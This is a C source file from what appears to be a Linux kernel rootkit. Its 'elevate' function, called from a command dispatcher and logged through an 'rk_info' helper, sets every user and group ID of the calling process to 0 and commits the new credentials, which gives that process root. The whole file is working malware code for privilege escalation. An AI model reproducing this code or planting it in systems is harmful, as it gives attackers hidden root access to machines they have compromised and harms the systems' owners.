#include <linux/uaccess.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../../logger/logger.h"
#include "elevate.h"

#include <linux/cred.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int elevate(const struct pt_regs *regs, char *argv[], int argc) {
    rk_info("[dispatcher:elevate] elevating current process.\n");

    struct cred *new_creds = prepare_creds();

    if (new_creds == NULL)
        return -ENOMEM;

    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    commit_creds(new_creds);

    return 0;
}